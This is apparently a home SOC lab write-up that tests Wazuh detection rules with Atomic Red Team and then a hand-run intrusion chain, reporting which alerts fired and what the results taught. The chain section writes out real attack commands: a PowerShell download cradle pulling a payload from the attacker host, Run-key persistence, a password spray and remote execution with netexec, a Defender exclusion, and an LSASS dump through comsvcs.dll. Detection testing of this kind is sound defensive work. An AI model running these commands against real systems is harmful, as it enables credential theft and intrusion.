# 05 - Attack Simulation

Running real techniques against the lab to find out whether the detections work. Atomic Red Team for individual techniques, then a hand-built chain that strings them together the way an actual intrusion does.

---

## Why Both

**Atomic Red Team** tests one technique in isolation. It answers "does my rule for T1547.001 fire". That is unit testing, and it is the right way to validate a rule.

**A chained scenario** answers a different question: can an analyst looking at the alert queue reconstruct what happened. Individual alerts firing correctly does not mean the story is readable. That only shows up when the techniques run in sequence against the same hosts and users.

I ran both. The unit tests found two rules that did not fire. The chain found something worse, which was that the alerts fired correctly but arrived in an order that made the sequence hard to follow.

---

## Ground Rules

```text
1. Snapshot every victim VM before a run. Never the SIEM
2. Note the exact start time before the first command
3. Record what you expect to fire, before you look
4. Run one technique, wait 60 seconds, check, move on
5. Write down what fired and what did not, including timings
6. Roll back after the run
```

**Step 3 matters more than it sounds.** Writing the expected result down before checking stops you rationalising a near miss into a hit. A rule that fires on a different event than you expected is not a working rule, it is a coincidence you have not understood yet.

---

## Atomic Red Team

### Setup

On WS11-01, as a local administrator, with Defender real-time protection temporarily disabled so the tests execute rather than being blocked at write time.

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
Import-Module Invoke-AtomicRedTeam
```

**Disabling Defender for a test run is itself a detection.** Rule SOC-1009 fired the moment I did it, which was the first useful result of the day and one I had not planned.

Running a test:

```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1 -ShowDetailsBrief
Invoke-AtomicTest T1547.001 -TestNumbers 1 -CheckPrereqs
Invoke-AtomicTest T1547.001 -TestNumbers 1
Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
```

Always `-ShowDetailsBrief` first. It prints exactly what the test will do, and some of the atomics are more destructive than the title implies.

### Results

| ATT&CK | Technique | Test | Expected rule | Fired | Latency |
| --- | --- | --- | --- | :---: | --- |
| T1059.001 | PowerShell encoded command | 2 | SOC-1003 | Yes | 6 s |
| T1059.001 | PowerShell download cradle | 1 | SOC-1003 | Yes | 8 s |
| T1547.001 | Run key, reg.exe | 1 | SOC-1004 | Yes | 5 s |
| T1547.001 | Run key, PowerShell | 3 | SOC-1004 | Yes | 7 s |
| T1547.001 | Startup folder shortcut | 7 | SOC-1004 | **No** | n/a |
| T1053.005 | Scheduled task, schtasks | 1 | SOC-1005 | Yes | 11 s |
| T1053.005 | Scheduled task, PowerShell | 2 | SOC-1005 | Yes | 9 s |
| T1543.003 | Service creation, sc.exe | 1 | SOC-1006 | Yes | 14 s |
| T1003.001 | LSASS dump, procdump | 1 | SOC-1007 | Yes | 4 s |
| T1003.001 | LSASS dump, comsvcs.dll | 2 | SOC-1007 | Yes | 4 s |
| T1003.001 | LSASS dump, Task Manager | 3 | SOC-1007 | Yes | 5 s |
| T1562.001 | Disable Defender real-time | 1 | SOC-1009 | Yes | 3 s |
| T1562.001 | Add Defender exclusion | 4 | SOC-1009 | Yes | 3 s |
| T1070.001 | Clear event log | 1 | SOC-1009 | Yes | 6 s |
| T1087.002 | Domain account discovery | 1 | none | **No** | n/a |
| T1110.003 | Password spray | 1 | SOC-1001 | Yes | 38 s |
| T1558.003 | Kerberoasting | 1 | SOC-1002 | Yes | 22 s |
| T1098 | Add user to Domain Admins | 1 | SOC-1010 | Yes | 9 s |

Sixteen of eighteen fired. Two did not.

### Failure 1: Startup folder persistence

T1547.001 test 7 drops a shortcut in the Startup folder rather than writing a Run key. My rule only watched the registry.

This is a genuine gap and an obvious one in hindsight. The Startup folder achieves the same persistence with no registry write at all.

The fix is a Sysmon event 11 rule on the two Startup paths:

```xml
<rule id="100404" level="12">
  <if_sid>61613</if_sid>
  <field name="win.eventdata.targetFilename">Start Menu\\\\Programs\\\\Startup</field>
  <description>Persistence: file written to the Startup folder. $(win.eventdata.targetFilename) by $(win.eventdata.image)</description>
  <mitre>
    <id>T1547.001</id>
  </mitre>
</rule>
```

Added, retested, fired in 5 seconds. Counted as a gap found rather than a gap covered, because it was not there when the chain ran.

### Failure 2: Domain account discovery

`net user /domain`, `net group "Domain Admins" /domain`, and the PowerShell and LDAP equivalents. Nothing fired because I never wrote a rule for it.

**I left this one open deliberately.** Discovery is genuinely hard to detect without a lot of false positives. `net user` is run by helpdesk staff constantly, and LDAP enumeration looks identical to what half of Windows does normally.

A rule on the command alone would fire every time a technician checked group membership. The realistic approach is volume-based: many discovery commands from one process inside a short window, which is what a tool does and a person does not. That is on the roadmap in [08-Metrics-and-Coverage.md](08-Metrics-and-Coverage.md) rather than pretended to be solved.

---

## The Chained Scenario

Eighteen isolated tests prove the rules work. They do not prove the SOC works. This is the run that did.

![Attack chain from initial access through credential access](images/attack-chain.svg)

### Scenario

A standard user receives a document. Opening it spawns PowerShell, which pulls a payload, which persists, enumerates, sprays a small password list, finds a weak service account, moves to a second workstation, and reaches for LSASS.

Nothing in that chain is novel. That is the point. It is the shape of a very large share of real intrusions, and if a SOC cannot see this one it cannot see anything.

### Execution

Run from KALI01 at 10.20.99.10. Target user `vbunny` on WS11-01.

**Stage 1, initial access. 14:02:11**

```bash
# Payload hosted on the attacker
python3 -m http.server 8080
```

The document runs a macro on open. In the lab the macro was written by hand rather than generated, so the command line is exactly what a real maldoc produces:

```text
powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...
```

Decoded:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.20.99.10:8080/u.ps1')
```

**Stage 2, persistence. 14:03:40**

```powershell
New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'OneDriveSync' -Value "$env:APPDATA\Microsoft\od.ps1" -PropertyType String -Force
```

Named `OneDriveSync` on purpose. A name that looks like Microsoft is what an attacker actually picks, and it tests whether the rule keys on the value rather than the name.

**Stage 3, discovery. 14:05:02**

```powershell
net user /domain
net group "Domain Admins" /domain
Get-ADUser -Filter * -Properties ServicePrincipalName |
    Where-Object ServicePrincipalName
```

**Stage 4, credential access by spray. 14:07:33**

```bash
netexec smb 10.20.10.10 -u users.txt -p 'Summer2025!' --continue-on-success
```

One hit, `svc_backup`.

**Stage 5, lateral movement. 14:11:19**

```bash
netexec smb 10.20.10.0/24 -u svc_backup -p 'Summer2025!' -x 'whoami'
```

Reached WS11-02.

**Stage 6, defence evasion. 14:13:44**

```powershell
Add-MpPreference -ExclusionPath 'C:\Users\Public'
```

**Stage 7, credential dumping. 14:14:58**

```text
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\o.bin full
```

Process 712 is LSASS. Output deliberately named `.bin` rather than `.dmp`, because a rule that keys on the extension is a rule an attacker defeats by renaming the file.

### What fired

| Time | Stage | Rule | Level | Latency |
| --- | --- | --- | :---: | --- |
| 14:02:13 | Word spawned PowerShell | SOC-1008 rule 100801 | 14 | **2 s** |
| 14:02:14 | Encoded PowerShell | SOC-1003 rule 100301 | 10 | 3 s |
| 14:02:19 | Download cradle | SOC-1003 rule 100302 | 10 | 8 s |
| 14:03:45 | Run key persistence | SOC-1004 rule 100402 | 12 | 5 s |
| 14:05:02 | Discovery | none | n/a | **missed** |
| 14:08:11 | Password spray | SOC-1001 rule 100103 | 12 | 38 s |
| 14:08:14 | Spray then success | SOC-1001 rule 100104 | 14 | 41 s |
| 14:11:26 | Service install, remote exec | SOC-1006 rule 100603 | 13 | 7 s |
| 14:13:47 | Defender exclusion added | SOC-1009 rule 100901 | 13 | 3 s |
| 14:15:02 | LSASS dump, comsvcs | SOC-1007 rule 100704 | 14 | 4 s |
| 14:15:03 | LSASS process access | SOC-1007 rule 100703 | 14 | 5 s |

Eleven alerts, seven of the nine techniques, mean latency 41 seconds including the spray. Excluding the spray, which is slow by design because it needs eight failures to accumulate, mean latency was 4.4 seconds.

**Total elapsed from first execution to credential dumping was 12 minutes 51 seconds.** That is the window a SOC has. It is not long.

---

## What the Chain Taught Me

The unit tests said the rules worked. The chain said something more useful.

### The first alert was the best one

SOC-1008, Word spawning PowerShell, fired at 14:02:13. Two seconds after the document opened, and ten minutes before anything was stolen.

Every other alert in the chain was a consequence of that one. Persistence, spray, lateral movement, dumping, all downstream. An analyst who worked the 14:02 alert properly would have contained this before stage 4.

**That changed how I rank alerts.** Severity should reflect where in the kill chain something sits, not just how alarming it sounds. An execution alert at minute zero is worth more than a credential access alert at minute thirteen, because at minute zero you can still stop it.

### Alert ordering made the story hard to read

The alerts arrived correctly but the dashboard sorted them by severity, so the level 14 LSASS alert sat at the top and the level 14 Word alert sat below it with nine others in between.

An analyst opening the queue sees credential dumping first and starts there, which is stage 7. Working backwards from stage 7 takes a long time.

Fixing this is not a rule change. It is grouping alerts by host and time so the sequence stays visible. Wazuh does not do this well out of the box and it is the single biggest operational weakness I found.

### The spray was slow and that is correct

38 seconds to detect the spray, against 3 to 8 seconds for everything else.

That is not a defect. The rule needs eight distinct account failures to accumulate before it can distinguish a spray from a forgotten password. Lowering the threshold would speed it up and reintroduce the false positives I spent the tuning pass removing.

**Latency and precision trade against each other directly.** A frequency-based rule is always slower than a signature-based one. Knowing which alerts are inherently slow stops you treating the delay as a problem to fix.

### Naming the payload well did not help the attacker

`OneDriveSync` in the Run key and `o.bin` instead of `.dmp` were both attempts to look benign. Neither worked, because neither rule keys on the name.

SOC-1004 keys on the value pointing into `AppData`. SOC-1007 keys on the handle to LSASS. Both are properties of what the attack has to do rather than what it chose to call itself.

That is the general principle and the chain demonstrated it cleanly. **Detect the behaviour that the technique requires, not the artefacts the attacker picked.**

---

## Cleanup

```powershell
# On each victim
Invoke-AtomicTest T1547.001 -TestNumbers 1,3,7 -Cleanup
Invoke-AtomicTest T1053.005 -TestNumbers 1,2 -Cleanup
Invoke-AtomicTest T1543.003 -TestNumbers 1 -Cleanup
Remove-MpPreference -ExclusionPath 'C:\Users\Public'
Set-MpPreference -DisableRealtimeMonitoring $false
```

Then roll back anyway:

```bash
qm rollback 110 clean-20260812
qm rollback 111 clean-20260812
```

**Roll back even after cleanup.** The atomics have cleanup routines and they are not complete. Files get left behind, registry values persist, and a lab that accumulates residue from past runs produces detections you cannot trust.

SIEM01 is untouched, so all the evidence from the run survives for the triage work in [06-Alert-Triage-Log.md](06-Alert-Triage-Log.md).

---

Next: [06-Alert-Triage-Log.md](06-Alert-Triage-Log.md)
